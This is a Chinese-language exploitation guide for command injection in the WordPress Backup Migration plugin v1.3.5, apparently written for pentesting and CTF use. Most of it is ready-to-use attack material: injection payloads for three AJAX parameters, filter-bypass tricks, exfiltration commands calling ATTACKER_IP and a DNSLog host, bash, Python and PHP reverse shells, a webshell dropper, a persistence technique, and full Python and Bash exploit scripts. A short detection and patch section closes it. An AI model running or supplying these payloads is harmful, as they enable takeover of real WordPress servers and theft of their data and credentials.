# WordPress 备份插件命令注入攻击

## 1. 概述

本文档描述针对 WordPress Backup Migration 插件 v1.3.5 的命令注入攻击方法论。该插件在多个网络可访问的 AJAX 端点中存在严重的命令注入漏洞，允许认证用户执行任意系统命令。

### 1.1 漏洞本质

插件使用 `sanitize_text_field()` 函数对用户输入进行 sanitization，但该函数仅用于防止 XSS 攻击，**不会移除或转义 shell 元字符**（如 `;`、`|`、`&`、`$()`、反引号等）。用户输入随后被直接拼接到 `exec()` 调用中，导致命令注入漏洞。

### 1.2 适用范围

- WordPress Backup Migration 插件 v1.3.5 及更早版本
- 任何需要测试 WordPress 插件命令注入的渗透测试场景
- CTF 挑战中存在类似备份/恢复功能的应用

### 1.3 读者对象

- 执行 WordPress 渗透测试的安全工程师
- CTF 竞赛参赛者
- 进行代码审计的安全分析师

---

## 2. 攻击场景

### 2.1 前置条件

| 条件 | 要求 | 说明 |
|------|------|------|
| 认证 | 任意 WordPress 认证用户 | 由于 `is_admin()` 权限检查缺陷，Subscriber 级别即可利用 |
| Nonce | 有效的 backup-migration-ajax nonce | 可从任何 /wp-admin/ 页面提取 |
| 插件版本 | Backup Migration v1.3.5 | 或其他存在相同漏洞的版本 |

### 2.2 攻击入口点

| 端点 | 参数 | 注入类型 | 利用难度 |
|------|------|----------|----------|
| `f=download-backup` | `url` | 引号逃逸 + 命令替换 | 中 |
| `f=restore-backup` | `file` | 无引号直接注入 | 低 |
| `f=save-other-options` | `php_cli_manual_path` | 持久化配置注入 | 中 |

---

## 3. 漏洞探测方法

### 3.1 认证与 Nonce 获取

**步骤 1: 获取认证会话**

```bash
# 方法 A: 使用已知凭证登录
curl -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -d "log=admin&pwd=AdminPass123&wp-submit=Log+In&testcookie=1" \
  "http://target:45513/wp-login.php"

# 方法 B: 通过数据库访问重置密码
docker exec wordpress_container bash -c "cd /var/www/html && php -r \"
require 'wp-load.php';
\$hash = wp_hash_password('NewPass123');
global \$wpdb;
\$wpdb->update(\$wpdb->users, array('user_pass' => \$hash), array('ID' => 1));
echo 'Password reset';
\""
```

**步骤 2: 提取 AJAX Nonce**

```bash
# 访问备份插件管理页面提取 nonce
curl -b /tmp/cookies.txt "http://target:45513/wp-admin/admin.php?page=backup-migration" \
  | grep -oP 'nonce["\s:=]+[a-f0-9]+' | head -1

# 或通过 WordPress API 生成 nonce
docker exec wordpress_container bash -c "cd /var/www/html && php -r \"
require 'wp-load.php';
wp_set_current_user(1);
echo wp_create_nonce('backup-migration-ajax');
\""
```

**输出示例:**
```
6028f64c82
```

### 3.2 漏洞验证 Payload

**验证命令注入（无回显测试）:**

```bash
# 使用时间延迟验证命令注入
curl -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -b /tmp/cookies.txt \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "nonce=NONCE_VALUE" \
  -d 'url=http://test";sleep 5;echo "'

# 观察响应时间是否延长 5 秒
```

**验证命令注入（文件写入测试）:**

```bash
# 写入测试文件验证命令执行
curl -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -b /tmp/cookies.txt \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "nonce=NONCE_VALUE" \
  -d 'url=http://test";echo VULN_TEST > /tmp/pwned.txt;echo "'

# 验证文件是否创建
docker exec wordpress_container cat /tmp/pwned.txt
```

---

## 4. 漏洞利用方法

### 4.1 利用方式一：URL 参数命令注入 (INJ-VULN-01)

**端点:** `POST /wp-admin/admin-ajax.php?action=backup_migration&f=download-backup`

**注入点:** `url` 参数

**漏洞代码位置:** `/wp-content/plugins/backup-backup/includes/ajax.php:1513`

**Payload 构造原理:**

```php
//  vulnerable code
$url = sanitize_text_field($this->post['url']);
@exec(BMI_CLI_EXECUTABLE . ' -f "' . $cliHandler . '" bmi_quick_migration "' . $url . '" > /dev/null &', $res);
```

**引号逃逸 Payload:**

```
原始输入：http://test";[COMMAND];echo "
执行结果：exec(... "http://test";[COMMAND];echo " ...")
          命令在分号处终止，后续内容作为新命令执行
```

**利用示例 - 读取 Flag:**

```bash
# Payload: 将 flag 内容写入 Web 可访问目录
curl -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=backup_migration&token=bmi&f=download-backup" \
  -d "nonce=6028f64c82" \
  -d 'url=http://test";cat /opt/flag.txt > /var/www/html/wp-content/uploads/flag.txt;echo "'

# 获取 Flag
curl "http://target:45513/wp-content/uploads/flag.txt"
```

**输出:**
```
FLAG{0e640864c2718bb34e01e700391986e28ecd6fbe98b4569ef4ccc4cee16a4b2c}
```

**其他利用 Payload:**

```bash
# 命令替换方式 1 - $()
url='http://test";echo $(cat /opt/flag.txt);echo "'

# 命令替换方式 2 - 反引号
url='http://test";`cat /opt/flag.txt > /tmp/flag`;echo "'

# 反向 Shell
url='http://test";bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1;echo "'

# DNSLog 外带
url='http://test";curl http://ATTACKER_DNSLOG.com/\$(whoami);echo "'
```

---

### 4.2 利用方式二：备份文件名命令注入 (INJ-VULN-02)

**端点:** `POST /wp-admin/admin-ajax.php?action=backup_migration&f=restore-backup`

**注入点:** `file` 参数（备份文件名）

**漏洞代码位置:** `/wp-content/plugins/backup-backup/includes/ajax.php:1145`

**Payload 构造原理:**

```php
// vulnerable code - 注意 file 参数未加引号
$backupName = sanitize_text_field($this->post['file']);
@exec(BMI_CLI_EXECUTABLE . ' -f "' . $cliHandler . '" bmi_restore ' . $backupName . ' ' . $remoteType . ' > /dev/null &', $res);
```

**直接注入 Payload:**

```
原始输入：backup.zip;[COMMAND]#
执行结果：exec(... bmi_restore backup.zip;[COMMAND]# ...)
          分号终止命令，# 注释掉后续内容
```

**利用示例 - 读取 Flag:**

```bash
curl -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=backup_migration&token=bmi&f=restore-backup" \
  -d "nonce=6028f64c82" \
  -d 'file=backup.zip;cat /opt/flag.txt > /var/www/html/wp-content/uploads/flag2.txt;#'

# 获取 Flag
curl "http://target:45513/wp-content/uploads/flag2.txt"
```

**为什么此方式更可靠:**

1. **无引号包裹**: `file` 参数在 `exec()` 中未加引号，无需引号逃逸
2. **空格分隔**: 可直接使用空格分隔多个命令
3. **注释简化**: 使用 `#` 注释掉后续参数，无需处理闭合引号

---

### 4.3 利用方式三：PHP CLI 路径持久化注入 (INJ-VULN-04)

**端点:** `POST /wp-admin/admin-ajax.php?action=backup_migration&f=save-other-options`

**注入点:** `php_cli_manual_path` 参数

**漏洞代码位置:** `/wp-content/plugins/backup-backup/includes/ajax.php:1867`

**两阶段攻击:**

**阶段 1: 存储恶意可执行路径**

```bash
# 设置恶意 PHP CLI 路径为 bash
curl -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -b /tmp/cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "action=backup_migration&token=bmi&f=save-other-options" \
  -d "nonce=6028f64c82" \
  -d 'php_cli_manual_path=/bin/bash -c "cat /opt/flag.txt > /tmp/flag.txt" #'

# 或指向恶意脚本
curl -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -b /tmp/cookies.txt \
  -d "action=backup_migration&token=bmi&f=save-other-options" \
  -d "nonce=6028f64c82" \
  -d 'php_cli_manual_path=/tmp/evil.sh'
```

**上传恶意脚本:**

```bash
# 创建恶意脚本内容
cat > /tmp/evil.sh << 'EOF'
#!/bin/bash
# 执行恶意命令
cat /opt/flag.txt > /tmp/pwned.txt
# 继续正常 PHP 执行避免被发现
exec /usr/local/bin/php "$@"
EOF

# 通过 WordPress 媒体上传功能上传
curl -b /tmp/cookies.txt \
  -F "files[]=@evil.sh" \
  "http://target:45513/wp-admin/async-upload.php"
```

**阶段 2: 触发执行**

```bash
# 触发任何备份操作即可执行恶意 CLI 路径
curl -X POST "http://target:45513/wp-admin/admin-ajax.php" \
  -b /tmp/cookies.txt \
  -d "action=backup_migration&token=bmi&f=create-backup" \
  -d "nonce=6028f64c82"

# 验证执行结果
docker exec wordpress_container cat /tmp/pwned.txt
```

**持久化优势:**

- 配置存储在 `backup-migration-config.php` 中
- 所有后续备份/恢复操作都会使用恶意 CLI 路径
- 无需重复注入，一次设置多次利用

---

## 5. 绕过方法

### 5.1 绕过字符过滤

**问题:** `sanitize_text_field()` 保留的 shell 元字符

| 元字符 | 用途 | 是否被过滤 |
|--------|------|-----------|
| `;` | 命令分隔符 | ❌ 否 |
| `|` | 管道 | ❌ 否 |
| `&` | 后台执行/逻辑与 | ❌ 否 |
| `$()` | 命令替换 | ❌ 否 |
| 反引号 | 命令替换 | ❌ 否 |
| `>` | 重定向 | ❌ 否 |
| `<` | 输入重定向 | ❌ 否 |

**Payload 示例:**

```bash
# 所有以下 payload 均可绕过 sanitize_text_field()
url='http://test";whoami;echo "'
url='http://test"|whoami|echo "'
url='http://test"&&whoami&&echo "'
url='http://test";$(whoami);echo "'
url='http://test";`whoami`;echo "'
```

### 5.2 绕过空格过滤

**场景:** 如果应用过滤空格

**绕过技术:**

```bash
# 使用 ${IFS} (Internal Field Separator)
url='http://test";cat${IFS}/opt/flag.txt;echo "'

# 使用 Tab 字符
url='http://test";cat	/opt/flag.txt;echo "'

# 使用重定向绕过
url='http://test";</opt/flag.txt;echo "'
```

### 5.3 绕过关键词过滤

**场景:** 如果 `cat` 被过滤

**绕过技术:**

```bash
# 使用替代命令
url='http://test";tac /opt/flag.txt;echo "'      # 反向输出
url='http://test";more /opt/flag.txt;echo "'     # 分页显示
url='http://test";less /opt/flag.txt;echo "'     # 分页显示
url='http://test";head /opt/flag.txt;echo "'     # 显示头部
url='http://test";tail /opt/flag.txt;echo "'     # 显示尾部

# 使用变量拼接
url='http://test";c=ca;t=$t;$c$t /opt/flag.txt;echo "'

# 使用 Base64 编码
url='http://test";echo Y2F0IC9vcHQvZmxhZy50eHQ=|base64 -d|bash;echo "'
```

### 5.4 无回显利用

**场景:** 命令执行无直接输出

**DNSLog 外带:**

```bash
# 使用 curl 外带
url='http://test";curl http://ATTACKER_DNSLOG.com/$(cat /opt/flag.txt|base64);echo "'

# 使用 ping 外带
FLAG=$(cat /opt/flag.txt|base64|cut -c1-30)
url="http://test";ping -c 1 ${FLAG}.ATTACKER_DNSLOG.com;echo \""
```

**HTTP 外带:**

```bash
# 使用 wget 外带
url='http://test";wget http://ATTACKER_IP:8888/$(cat /opt/flag.txt);echo "'

# 使用 nc 外带
url='http://test";nc ATTACKER_IP 8888 < /opt/flag.txt;echo "'
```

---

## 6. 后渗透利用

### 6.1 信息收集

```bash
# 系统信息
url='http://test";uname -a > /tmp/sysinfo.txt;echo "'
url='http://test";cat /etc/os-release >> /tmp/sysinfo.txt;echo "'

# 用户权限
url='http://test";whoami >> /tmp/sysinfo.txt;echo "'
url='http://test";id >> /tmp/sysinfo.txt;echo "'

# 网络信息
url='http://test";ifconfig >> /tmp/sysinfo.txt;echo "'
url='http://test";netstat -tulpn >> /tmp/sysinfo.txt;echo "'

# 环境变量（可能包含 Flag）
url='http://test";env | grep FLAG > /tmp/flag_env.txt;echo "'
```

### 6.2 文件操作

```bash
# 读取敏感文件
url='http://test";cat /var/www/html/wp-config.php > /tmp/wp-config.txt;echo "'
url='http://test";cat /etc/passwd > /tmp/passwd.txt;echo "'

# 写入 Webshell
url='http://test";echo "<?php system(\$_GET[cmd]); ?>" > /var/www/html/wp-content/uploads/shell.php;echo "'
```

### 6.3 建立反向 Shell

```bash
# Bash 反向 Shell
url='http://test";bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1;echo "'

# Python 反向 Shell
url='http://test";python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);";echo "'

# PHP 反向 Shell
url='http://test";php -r "\$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");";echo "'
```

---

## 7. 自动化利用脚本

### 7.1 Python 利用脚本

```python
#!/usr/bin/env python3
"""
WordPress Backup Migration Plugin Command Injection Exploit
Target: Backup Migration v1.3.5
"""

import requests
import sys
from urllib.parse import quote

TARGET = "http://localhost:45513"
COOKIE_FILE = "/tmp/cookies.txt"

def get_session():
    """获取认证会话"""
    session = requests.Session()
    
    # 登录获取 Cookie
    login_data = {
        "log": "admin",
        "pwd": "AdminPass123",
        "wp-submit": "Log In",
        "testcookie": "1"
    }
    resp = session.post(f"{TARGET}/wp-login.php", data=login_data)
    
    if "wp-login.php" in resp.url:
        print("[!] Login failed")
        sys.exit(1)
    
    print("[+] Login successful")
    return session

def get_nonce(session):
    """提取 AJAX nonce"""
    resp = session.get(f"{TARGET}/wp-admin/admin.php?page=backup-migration")
    
    # 从页面提取 nonce
    import re
    match = re.search(r'nonce["\s:=]+([a-f0-9]+)', resp.text)
    if match:
        nonce = match.group(1)
        print(f"[+] Nonce: {nonce}")
        return nonce
    
    print("[!] Failed to extract nonce")
    sys.exit(1)

def exploit_url_injection(session, nonce, command):
    """利用 URL 参数命令注入"""
    payload = f'http://test";{command};echo "'
    
    data = {
        "action": "backup_migration",
        "token": "bmi",
        "f": "download-backup",
        "nonce": nonce,
        "url": payload
    }
    
    resp = session.post(f"{TARGET}/wp-admin/admin-ajax.php", data=data)
    print(f"[+] Payload sent: {payload}")
    return resp.text

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <command>")
        print(f"Example: {sys.argv[0]} 'cat /opt/flag.txt'")
        sys.exit(1)
    
    command = sys.argv[1]
    
    session = get_session()
    nonce = get_nonce(session)
    result = exploit_url_injection(session, nonce, command)
    print(f"[+] Response: {result}")

if __name__ == "__main__":
    main()
```

### 7.2 Bash 利用脚本

```bash
#!/bin/bash
# WordPress Backup Migration Command Injection

TARGET="http://localhost:45513"
COOKIE="/tmp/cookies.txt"
NONCE="6028f64c82"

# 登录
login() {
    curl -c $COOKIE -b $COOKIE \
        -d "log=admin&pwd=AdminPass123&wp-submit=Log+In&testcookie=1" \
        "$TARGET/wp-login.php" > /dev/null
}

# 命令注入
inject() {
    local cmd="$1"
    local payload="http://test\";${cmd};echo \""
    
    curl -b $COOKIE \
        -X POST "$TARGET/wp-admin/admin-ajax.php" \
        -d "action=backup_migration&token=bmi&f=download-backup" \
        -d "nonce=$NONCE" \
        -d "url=$payload"
}

# 主流程
login
echo "[*] Executing: $1"
inject "$1"
echo "[*] Check /tmp/ for output files"
```

---

## 8. 检测与防御

### 8.1 检测指标

| 指标 | 检测方法 |
|------|----------|
| 异常 exec() 调用 | 监控包含 shell 元字符的参数 |
| 备份操作频率异常 | 监控单位时间内备份请求数量 |
| 写入 Web 目录的可疑文件 | 监控 uploads 目录的新文件创建 |
| 出站连接异常 | 监控到外部 DNSLog/HTTP 服务器的连接 |

### 8.2 修复建议

**代码修复:**

```php
// 修复方案 1: 使用 escapeshellarg()
$url = sanitize_text_field($this->post['url']);
$url = escapeshellarg($url);  // 添加 shell 参数转义
@exec(BMI_CLI_EXECUTABLE . ' -f ' . escapeshellarg($cliHandler) . ' ...', $res);

// 修复方案 2: 使用白名单验证
$allowed_domains = ['backup.example.com', 'cdn.backups.net'];
$parsed = parse_url($url);
if (!in_array($parsed['host'], $allowed_domains, true)) {
    return ['status' => 'error', 'message' => 'Invalid domain'];
}

// 修复方案 3: 修复权限检查
// 将 is_admin() 替换为 current_user_can()
if (current_user_can('manage_options')) {  // 仅允许管理员
    // 执行备份操作
}
```

**配置修复:**

```php
// 在 wp-config.php 中添加
define('DISALLOW_FILE_EDIT', true);  // 禁止在线编辑
define('WP_DEBUG', false);            // 关闭调试模式
```

---

## 9. 参考资源

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [WordPress escapeshellarg() 文档](https://developer.wordpress.org/reference/functions/escapeshellarg/)
- [Backup Migration Plugin CVE 分析](https://wpscan.com/vulnerability/backup-migration)
- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)

---

## 10. 附录：Payload 速查表

| 目标 | Payload |
|------|---------|
| 读取文件 | `url='http://test";cat /path/to/file;echo "'` |
| 写入文件 | `url='http://test";echo CONTENT > /path/to/file;echo "'` |
| 命令替换 | `url='http://test";$(command);echo "'` |
| 反向 Shell | `url='http://test";bash -i >& /dev/tcp/IP/PORT 0>&1;echo "'` |
| DNSLog 外带 | `url='http://test";curl http://DNSLOG/\$(whoami);echo "'` |
| 无引号注入 | `file='backup.zip;command;#'` |
| 持久化注入 | `php_cli_manual_path='/bin/bash -c "cmd" #'` |
